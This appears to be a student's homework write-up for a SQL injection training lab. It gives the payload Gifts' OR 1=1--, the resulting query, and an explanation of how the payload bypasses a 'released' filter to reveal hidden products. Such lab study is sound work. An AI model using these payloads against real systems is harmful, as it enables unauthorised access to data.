
# SQL Injection Homework – Week 9

## Lab 1 – Retrieve Hidden Data

**Payload:**
```sql
Gifts' OR 1=1--
```

**SQL Query:**
```sql
SELECT * FROM products
WHERE category = 'Gifts' OR 1=1--'
AND released = 1;
```

**Explanation:**

The condition 1=1 is always true. The -- comments out the released check, so hidden products are also displayed.